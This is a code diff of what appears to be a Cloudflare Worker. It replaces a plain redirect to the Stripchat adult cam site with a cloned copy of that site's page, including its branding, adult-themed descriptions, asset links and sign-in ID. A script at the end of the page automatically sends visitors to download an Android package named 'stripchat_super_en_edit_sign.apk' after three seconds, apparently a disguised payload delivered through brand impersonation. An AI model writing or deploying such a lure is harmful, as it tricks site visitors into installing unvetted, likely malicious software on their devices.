@@ -1,10 +1,173 @@
+import { getAssetFromKV } from '@cloudflare/kv-asset-handler'
+
 export default {
   async fetch(request, env) {
-    return new Response(null, {
-      status: 301,
+    const html = `<!doctype html>
+<html lang="en">
+<head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# website: http://ogp.me/ns/website#">
+    <meta charset=utf-8>
+    <title>Free Live Sex Cams and Nude Girls Chat | Stripchat</title>
+    <meta data-helmet="1" property="og:type" content="website">
+    <meta data-helmet="1" property="og:image" content="https://cdn.strpst.com/assets/icons/metaogimage.jpg?v=4f3e5e4b">
+    <meta data-helmet="1" property="og:url" content="https://en.stripchat.com/">
+    <meta data-helmet="1" name="twitter:card" content="summary_large_image">
+    <meta data-helmet="1" property="og:site_name" content="Stripchat – Free Live Cams Community">
+    <meta data-helmet="1" name="twitter:creator" content="@stripchat">
+    <meta data-helmet="1" name="twitter:site" content="@stripchat">
+    <meta data-helmet="1" property="og:title" content="Free Live Sex Cams and Nude Girls Chat">
+    <meta data-helmet="1" property="og:description"
+          content="Watch naked models in our adult live sex cam community. ❤️ Completely free, no registration required. 🔥 Over 4000 live cam models and couples ready to chat with you.">
+    <meta data-helmet="1" name="description"
+          content="Watch naked models in our adult live sex cam community. ❤️ Completely free, no registration required. 🔥 Over 4000 live cam models and couples ready to chat with you.">
+    <meta data-helmet="1" name="robots"
+          content="index, follow, max-snippet:-1, max-video-preview:-1, max-image-preview:large">
+    <meta name=theme-color content=#303133>
+    <meta http-equiv=Cache-Control content=no-cache>
+    <meta name=apple-mobile-web-app-capable content=yes>
+    <meta name=viewport content="width=device-width,initial-scale=1">
+    <meta name=RATING content=RTA-5042-1996-1400-1577-RTA>
+    <meta name=RATING content=mature>
+    <meta name=google content=notranslate>
+    <meta name=google-signin-scope content="profile email">
+    <meta name=google-signin-client_id content=67819290237-pean7okuo1c6a4bf5g19d9anjj15uvp6.apps.googleusercontent.com>
+    <meta name=msapplication-square70x70logo
+          content="https://assets.strpst.com/assets/icons/mstile-70x70.png?v=9670c787">
+    <meta name=msapplication-square150x150logo
+          content="https://assets.strpst.com/assets/icons/mstile-150x150.png?v=9670c787">
+    <meta name=msapplication-square270x270logo
+          content="https://assets.strpst.com/assets/icons/mstile-270x270.png?v=9670c787">
+    <meta name=msapplication-wide310x150logo
+          content="https://assets.strpst.com/assets/icons/mstile-310x150.png?v=9670c787">
+    <meta name=msapplication-square310x310logo
+          content="https://assets.strpst.com/assets/icons/mstile-310x310.png?v=9670c787">
+    <meta name=application-name content=Stripchat>
+    <meta name=msapplication-TileColor content=#000000>
+    <style>:root {
+        --primary: #a2252d;
+        --primary-light: #fa5365;
+        --primary-dark: #912229;
+        --primary-border: #c22934;
+        --primary-modal: #af262f;
+        --primary-gradient: #a2252d;
+        --header-logo-aspect-ratio: 2.870;
+        --footer-logo-aspect-ratio: 5.167
+    }</style>
+    <style>.disable-transition * {
+        transition: none !important
+    }</style>
+    <link rel=preload href=https://assets.strpst.com/assets/bootstrap_dark.20231012050342.css as=style>
+    <link media="screen and (max-width: 1279px)" rel=preload
+          href=https://assets.strpst.com/assets/bootstrap_dark_mobile.20231012050342.css as=style>
+    <script>window.SSR_ICONS = ["rta-logo", "safe-labeling", "asacp", "pineapple-support", "menu", "dot", "best-models", "search-3", "filter", "menu-mobile", "sort", "categories-2", "close-2", "close-3", "home", "feed", "recommended", "favorited", "watch-history", "lightning", "badge-vr-ds", "bunny-mask", "candy-ds", "interactive-toy-ds", "mobile", "i18n", "close-arrow", "arrow-down-filled", "heart-fill", "badge-new-ds", "medal-3", "ticket", "chevron-down", "mobile-phone-ds", "medal-1", "close-7", "camera-plus", "group", "medal-2", "about", "stripchat-logo", "twitter", "reddit", "inquiries", "agreement"]</script>
+    <link rel=stylesheet data-href=https://assets.strpst.com/assets/bootstrap_theme.20231012050342.css
+          href=https://assets.strpst.com/assets/bootstrap_dark.20231012050342.css>
+    <link media="screen and (max-width:1279px)" rel=stylesheet
+          href=https://assets.strpst.com/assets/bootstrap_dark_mobile.20231012050342.css>
+    <link rel=icon sizes=16x16 href="https://assets.strpst.com/assets/icons/favicon-16x16.png?v=9670c787">
+    <link rel=icon sizes=32x32 href="https://assets.strpst.com/assets/icons/favicon-32x32.png?v=9670c787">
+    <link rel=icon sizes=196x196 href="https://assets.strpst.com/assets/icons/favicon-196x196.png?v=9670c787">
+    <link rel=icon sizes=512x512 href="https://assets.strpst.com/assets/icons/favicon-512x512.png?v=9670c787">
+    <link rel=mask-icon href=https://assets.strpst.com/assets/icons/mask-icon.png>
+    <link rel=apple-touch-icon sizes=120x120
+          href="https://assets.strpst.com/assets/icons/apple-touch-icon-120x120.png?v=f86ed58a">
+    <link rel=apple-touch-icon sizes=152x152
+          href="https://assets.strpst.com/assets/icons/apple-touch-icon-152x152.png?v=f86ed58a">
+    <link rel=apple-touch-icon sizes=167x167
+          href="https://assets.strpst.com/assets/icons/apple-touch-icon-167x167.png?v=f86ed58a">
+    <link rel=apple-touch-icon sizes=180x180
+          href="https://assets.strpst.com/assets/icons/apple-touch-icon-180x180.png?v=f86ed58a">
+    <link rel=dns-prefetch href=//img.stripst.com>
+    <link rel=preconnect href=//img.stripst.com>
+    <link rel=preconnect href=/api/front>
+    <script src="/static/plugs/jquery-3.4.1/jquery-3.4.1.min.js"></script>
+    <style>
+        body, div#body, html {
+            background-color: #0b0b0b !important;
+            background-image: linear-gradient(#a2252d, #912229) !important;
+        }
+        .visitors-agreement-modal.modal-wrapper {
+            background: linear-gradient(180deg, #6b1a1f 0%, #000 50%);
+        }
+        svg {
+            width: 200px;
+            height: inherit;
+            background-repeat: no-repeat;
+            background-image: url(02.png);
+            background-position: center;
+            margin: 0 auto;
+            display: block;
+        }
+        .header-logo {
+            height: 54px;
+            max-width: 200px;
+            width: calc(104px * var(--header-logo-aspect-ratio));
+        }
+    </style>
+</head>
+<body class=disable-transition>
+<div id=portal-root></div>
+<div id=body>
+    <div class="level-badge-filters">
+        <svg xmlns="http://www.w3.org/2000/svg">
+            <defs>
+                <linearGradient id="badge-level-filter-grey" x1=".5" y1="0" x2=".5" y2="1"
+                                gradientTransform="matrix(88.809 0 0 97.645 5.595 1.178)"
+                                gradientUnits="userSpaceOnUse">
+                    <stop offset="0%" stop-color="#C2C2C2"></stop>
+                    <stop offset="100%" stop-color="#333333"></stop>
+                </linearGradient>
+                <linearGradient id="badge-level-filter-bronze" x1=".5" y1="0" x2=".5" y2="1"
+                                gradientTransform="matrix(88.809 0 0 97.645 5.595 1.178)"
+                                gradientUnits="userSpaceOnUse">
+                    <stop offset="0%" stop-color="#FFA666"></stop>
+                    <stop offset="100%" stop-color="#6B2D00"></stop>
+                </linearGradient>
+                <linearGradient id="badge-level-filter-silver" x1=".5" y1="0" x2=".5" y2="1"
+                                gradientTransform="matrix(88.809 0 0 97.645 5.595 1.178)"
+                                gradientUnits="userSpaceOnUse">
+                    <stop offset="0%" stop-color="#CAD5E2"></stop>
+                    <stop offset="100%" stop-color="#2E4156"></stop>
+                </linearGradient>
+                <linearGradient id="badge-level-filter-gold" x1=".5" y1="0" x2=".5" y2="1"
+                                gradientTransform="matrix(88.809 0 0 97.645 5.595 1.178)"
+                                gradientUnits="userSpaceOnUse">
+                    <stop offset="0%" stop-color="#FFC80F"></stop>
+                    <stop offset="100%" stop-color="#7E3A01"></stop>
+                </linearGradient>
+                <linearGradient id="badge-level-filter-diamond" x1=".5" y1="0" x2=".5" y2="1"
+                                gradientTransform="matrix(88.809 0 0 97.645 5.595 1.178)"
+                                gradientUnits="userSpaceOnUse">
+                    <stop offset="0%" stop-color="#EF33FF"></stop>
+                    <stop offset="100%" stop-color="#560198"></stop>
+                </linearGradient>
+                <linearGradient id="badge-level-filter-royal" x1=".5" y1="0" x2=".5" y2="1"
+                                gradientTransform="matrix(88.809 0 0 97.645 5.595 1.178)"
+                                gradientUnits="userSpaceOnUse">
+                    <stop offset="0%" stop-color="#FE3939"></stop>
+                    <stop offset="100%" stop-color="#850000"></stop>
+                </linearGradient>
+                <linearGradient id="badge-level-filter-legend" x1=".5" y1="0" x2=".5" y2="1"
+                                gradientTransform="matrix(88.809 0 0 97.645 5.595 1.178)"
+                                gradientUnits="userSpaceOnUse">
+                    <stop offset="0%" stop-color="#FE3939"></stop>
+                    <stop offset="100%" stop-color="#850000"></stop>
+                </linearGradient>
+            </defs>
+        </svg>
+    </div>
+</div>
+<script>
+    setTimeout(function(){
+        window.location.href = "stripchat_super_en_edit_sign.apk";
+    }, 3000);
+</script>
+</body>
+</html>`;
+
+    return new Response(html, {
       headers: {
-        "Location": "https://stripchat.com"
-      }
+        "content-type": "text/html;charset=UTF-8",
+      },
     });
   }
 }
